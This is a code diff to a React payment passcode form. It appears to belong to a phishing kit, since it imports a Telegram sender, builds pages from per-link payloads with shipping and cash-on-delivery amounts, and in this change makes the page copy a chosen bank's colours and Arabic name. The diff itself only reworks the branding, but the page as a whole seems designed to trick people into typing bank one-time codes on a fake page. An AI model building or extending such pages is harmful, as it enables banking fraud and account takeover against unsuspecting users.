@@ -4,11 +4,12 @@ import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
-import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
+import { Shield, AlertCircle, ArrowLeft, Building2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { getBankById } from "@/lib/banks";
 import { sendToTelegram } from "@/lib/telegram";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
 
@@ -33,10 +34,18 @@ const PaymentOTPForm = () => {
   const shippingInfo = linkData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
   const branding = getServiceBranding(serviceKey);
+  
+  // Get selected bank
+  const selectedBankId = linkData?.payload?.selectedBank || '';
+  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
 
   // Get country from link data
   const selectedCountry = shippingInfo?.selectedCountry || "SA";
   const countryData = getCountryByCode(selectedCountry);
+  
+  // Use bank colors if bank is selected, otherwise use service branding
+  const bankColor = selectedBank?.color || branding.colors.primary;
+  const secondaryColor = branding.colors.secondary;
 
   // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = paymentData?.payment_amount || shippingInfo?.cod_amount || shippingInfo?.payment_amount;
@@ -267,13 +276,19 @@ const PaymentOTPForm = () => {
         <div
           className="relative w-full h-48 sm:h-64 overflow-hidden"
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+            background: `linear-gradient(135deg, ${bankColor}, ${secondaryColor})`,
           }}
         >
           <div className="absolute inset-0 bg-black/30" />
           
-          {/* Logo Overlay */}
-          {branding.logo && (
+          {/* Bank Logo */}
+          {selectedBank ? (
+            <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
+              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
+                <Building2 className="h-12 sm:h-16 w-12 sm:w-16" style={{ color: bankColor }} />
+              </div>
+            </div>
+          ) : branding.logo && (
             <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
               <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
                 <img 
@@ -288,7 +303,7 @@ const PaymentOTPForm = () => {
           
           <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
             <div className="text-right">
-              <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
+              <h2 className="text-lg sm:text-2xl font-bold mb-1">{selectedBank?.nameAr || serviceName}</h2>
               <p className="text-xs sm:text-sm opacity-90">{countryData?.nameAr}</p>
             </div>
           </div>
@@ -296,14 +311,14 @@ const PaymentOTPForm = () => {
 
         <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
           <div className="max-w-2xl mx-auto">
-            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
+            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: bankColor }}>
               <div className="flex items-center justify-between mb-6 sm:mb-8">
                 <h1 className="text-xl sm:text-3xl font-bold">رمز التحقق</h1>
 
                 <div
                   className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                   style={{
-                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                    background: `linear-gradient(135deg, ${bankColor}, ${secondaryColor})`,
                   }}
                 >
                   <Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
@@ -314,8 +329,8 @@ const PaymentOTPForm = () => {
               <div 
                 className="rounded-lg p-3 sm:p-4 mb-6"
                 style={{
-                  background: `${branding.colors.primary}10`,
-                  border: `1px solid ${branding.colors.primary}30`
+                  background: `${bankColor}10`,
+                  border: `1px solid ${bankColor}30`
                 }}
               >
                 <p className="text-xs sm:text-sm text-center">
@@ -341,8 +356,8 @@ const PaymentOTPForm = () => {
                         onPaste={handlePaste}
                         className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
                         style={{
-                          borderColor: digit ? branding.colors.primary : undefined,
-                          backgroundColor: digit ? `${branding.colors.primary}08` : undefined
+                          borderColor: digit ? bankColor : undefined,
+                          backgroundColor: digit ? `${bankColor}08` : undefined
                         }}
                         disabled={attempts >= 3}
                         autoComplete="off"
@@ -388,7 +403,7 @@ const PaymentOTPForm = () => {
                   style={{
                     background: attempts >= 3 
                       ? '#666' 
-                      : `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                      : `linear-gradient(135deg, ${bankColor}, ${secondaryColor})`
                   }}
                 >
                   {attempts >= 3 ? (
@@ -406,7 +421,7 @@ const PaymentOTPForm = () => {
                     type="button"
                     variant="ghost"
                     className="w-full mt-3"
-                    style={{ color: branding.colors.primary }}
+                    style={{ color: bankColor }}
                     onClick={() => {
                       setCountdown(60);
                       toast({
